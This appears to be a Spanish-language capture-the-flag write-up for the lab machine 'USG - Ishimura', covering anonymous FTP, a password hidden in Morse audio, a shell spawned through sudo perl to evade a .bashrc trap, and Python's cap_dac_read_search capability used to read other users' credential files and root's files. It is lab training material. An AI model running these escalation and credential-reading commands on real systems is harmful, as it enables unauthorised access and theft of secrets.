# 🖥️ Write-Up: USG - Ishimura

## 📌 Información General

| Campo | Detalle |
|---|---|
| **Nombre** | USG - Ishimura |
| **Plataforma** | The Hackers Labs |
| **Dificultad** | Avanzado |
| **OS** | Linux |
| **IP** | 192.168.56.102 |
| **Fecha** | 14/04/2026 |
| **Objetivos** | Flag de usuario y flag de root |

---

## 🔍 1. Reconocimiento

### Descubrimiento de host

```bash
nmap -sn 192.168.56.0/24
```

La máquina responde en `192.168.56.102`.

### Escaneo de puertos

```bash
nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 192.168.56.102 -oN ishimura_scan.txt
```

**Puertos abiertos:**

| Puerto | Servicio | Versión |
|---|---|---|
| 21/tcp | FTP | vsftpd 3.0.3 |
| 22/tcp | SSH | OpenSSH 9.2p1 |
| 80/tcp | HTTP | Apache 2.4.62 |

**Hallazgo crítico:** El FTP permite login anónimo (`ftp-anon: Anonymous FTP login allowed`) y expone un archivo `what_the_fuck.wav`.

---

## 🎯 2. Explotación

### FTP Anónimo → Credenciales de chen

Accedemos al FTP sin contraseña:

```bash
ftp 192.168.56.102
# Usuario: anonymous | Contraseña: (vacía)
```

Descargamos el archivo de audio:

```bash
get what_the_fuck.wav
bye
```

Analizamos el audio con un decodificador de morse online:
```
https://morsecode.world/international/decoder/audio-decoder-adaptive.html
```

El morse revela:
```
TU CONTRASENA DE CHEN ES GATONEGROISHIMURA
```

**Credenciales obtenidas:** `chen : gatonegroishimura`

### Acceso SSH como chen

```bash
ssh chen@192.168.56.102
```

---

## 🔓 3. Escalada Lateral: chen → hammond

### Enumeración de privilegios

```bash
sudo -l
```

Resultado:
```
(hammond) NOPASSWD: /usr/bin/perl
```

`chen` puede ejecutar `perl` como `hammond` sin contraseña. Usamos este permiso para obtener una shell:

```bash
sudo -u hammond perl -e 'exec "/bin/sh"'
```

> ⚠️ **Nota:** El sistema tiene una trampa en el `.bashrc` de hammond que mata cualquier sesión de `bash`. Usamos `/bin/sh` en su lugar para evitar que se ejecute el `.bashrc` y evadir el mecanismo de detección.

### Flag de usuario

```bash
cat /home/hammond/user.txt
```

```
THL_USER{N0_H4Y_R3T0RNO_EN_L4_ISH1MUR4}
```

---

## 🔓 4. Escalada Lateral: hammond → kendra

### Enumeración de capabilities

```bash
getcap -r / 2>/dev/null
```

Resultado:
```
/usr/bin/python3.11 cap_dac_read_search=ep
```

La capability `cap_dac_read_search` permite a Python leer **cualquier archivo del sistema** ignorando permisos. Las notas de hammond revelan que kendra guarda sus credenciales en `/home/kendra/CRED_ACCESO_SISTEMA.txt`:

```bash
/usr/bin/python3.11 -c 'print(open("/home/kendra/CRED_ACCESO_SISTEMA.txt").read())'
```

**Credenciales obtenidas:** `kendra : kendra_is_watching_you`

```bash
su kendra
```

---

## 👑 5. Escalada de Privilegios: kendra → root

### Análisis del audio de kendra

En el home de kendra encontramos `transmision_laboratorio.wav`. Lo transferimos a Kali:

```bash
# En kendra:
cp ~/transmision_laboratorio.wav /home/chen/ftp/
chmod 777 /home/chen/ftp/transmision_laboratorio.wav

# En Kali:
scp chen@192.168.56.102:/home/chen/ftp/transmision_laboratorio.wav .
```

Generamos el espectrograma para visualizar información oculta en las frecuencias:

```bash
sox transmision_laboratorio.wav -n spectrogram -o espectrograma.png
eog espectrograma.png
```

El espectrograma revela la palabra: **EFIGIE**

### Lectura de archivos de root con Python

En lugar de necesitar la contraseña de root, usamos la capability de Python para leer directamente sus archivos:

```bash
/usr/bin/python3.11 -c 'print(open("/root/.bashrc").read())'
```

El `.bashrc` de root ejecuta `/root/banner.sh`. Lo leemos:

```bash
/usr/bin/python3.11 -c 'print(open("/root/banner.sh").read())'
```

### Flag de root

```
THL_ROOT{EFIGIE_HAS_SIDO_DIGNIFICADO}
```

---

## 📊 6. Resumen del ataque

| Fase | Técnica | Herramienta | Resultado |
|---|---|---|---|
| Reconocimiento | Escaneo de puertos | Nmap | Puertos 21, 22, 80 |
| Acceso inicial | FTP anónimo + morse en audio | ftp, morsecode.world | Credenciales chen |
| Escalada lateral | sudo perl NOPASSWD | perl | Shell como hammond |
| Escalada lateral | cap_dac_read_search | python3.11 | Credenciales kendra |
| Escalada a root | Espectrograma + cap_dac_read_search | sox, python3.11 | Flag de root |

---

## 🧠 7. Conceptos clave (eJPT)

- **FTP anónimo:** Error de configuración que permite acceso sin credenciales
- **Esteganografía:** Información oculta dentro de archivos de audio (morse, espectrograma)
- **sudo mal configurado:** Permisos NOPASSWD sobre binarios que permiten ejecución de comandos
- **Linux Capabilities:** `cap_dac_read_search` permite leer cualquier archivo del sistema ignorando permisos — más peligroso que sudo en algunos escenarios
- **Evasión de detección:** Usar `/bin/sh` en lugar de `/bin/bash` para evitar trampas en `.bashrc`

---

## 🐇 8. Rabbit Holes (Caminos sin salida)

### El MD5 de "efigie" no era la contraseña de root

El espectrograma del audio revelaba la palabra **EFIGIE**. La narrativa de la máquina indicaba claramente que había que calcular su "firma digital de 128 bits" — es decir, su hash MD5:

```bash
echo -n "efigie" | md5sum
# Resultado: 2795cbf7fad244fc15b23b31e9ba7524
```

Probamos este hash como contraseña de root por múltiples vías (`su root`, `ssh root@...`) sin éxito. También probamos variaciones de mayúsculas, letras ambiguas del espectrograma y distintas grafías de la palabra.

**Lo que realmente funcionó:** No necesitábamos entrar como root en absoluto. La capability `cap_dac_read_search` de Python nos permitía leer cualquier archivo del sistema directamente — incluyendo el `.bashrc` y `banner.sh` de root donde estaba la flag. La contraseña de root era un camino innecesario.

> 💡 **Lección aprendida:** Cuando una vía de ataque se atasca, hay que dar un paso atrás y preguntarse si realmente necesitamos ese acceso o si hay otra forma de llegar al objetivo. En este caso teníamos la herramienta correcta desde el principio y no lo vimos.

---

## 📝 9. Notas adicionales

- El historial de comandos estaba redirigido a `/dev/null` en varios usuarios (`~/.bash_history -> /dev/null`) — técnica común para borrar huellas
- La capability de Python fue más poderosa que tener la contraseña de root — nunca necesitamos autenticarnos como root para leer sus archivos
- La trampa del `.bashrc` de hammond es un ejemplo real de mecanismo de defensa activo en sistemas comprometidos
